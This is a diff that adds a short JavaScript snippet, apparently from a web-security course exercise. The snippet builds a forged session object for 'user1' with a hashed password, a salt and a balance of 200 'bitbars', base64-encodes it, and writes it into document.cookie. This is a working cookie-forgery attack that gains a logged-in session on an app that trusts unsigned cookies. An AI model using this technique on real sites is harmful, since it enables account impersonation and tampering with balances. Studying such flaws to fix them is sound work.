@@ -1,0 +1,13 @@
+const fakeInfo = {
+	"loggedIn":true,
+	"account":{
+		"username":"user1",
+		"hashedPassword":"8146ff33e815e1a08eae2b473bf2cca159582e434c52524c3325f06e8c2b80d9",
+		"salt":"1337",
+		"profile":"",
+		"bitbars":200
+	}
+};
+const fakeInfoBase64 = btoa(JSON.stringify(fakeInfo))
+const fakeCookie = 'session='+ fakeInfoBase64;
+document.cookie = fakeCookie;
